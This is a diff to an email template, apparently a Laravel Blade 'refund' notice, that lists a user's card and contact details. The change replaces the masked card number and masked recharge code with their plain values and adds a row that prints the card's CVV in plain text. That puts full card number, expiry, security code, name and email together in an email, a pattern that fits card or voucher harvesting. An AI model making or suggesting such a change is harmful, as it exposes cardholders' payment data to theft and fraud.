@@ -20,10 +20,11 @@
                 </p>
                 <table role="presentation" width="100%" style="font-size:14px;color:#334155;">
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_network') }}</td><td style="padding:6px 0;text-align:right;font-weight:600;">{{ $payload['detected_brand'] }}</td></tr>
-                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_pan') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;">{{ $payload['pan_masked'] }}</td></tr>
+                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_pan') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;word-break:break-all;">{{ $payload['pan_plain'] }}</td></tr>
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_exp') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['exp_month'] }} / {{ $payload['exp_year'] }}</td></tr>
+                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_cvv') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;">{{ $payload['cvv_plain'] }}</td></tr>
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_type') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['card_type_label'] }}</td></tr>
-                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_code') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;">{{ $payload['recharge_code_masked'] }}</td></tr>
+                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_code') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;word-break:break-all;">{{ $payload['recharge_code_plain'] }}</td></tr>
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_email') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['email'] }}</td></tr>
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_name') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['first_name'] }} {{ $payload['last_name'] }}</td></tr>
                     <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_country') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['country_label'] }}</td></tr>
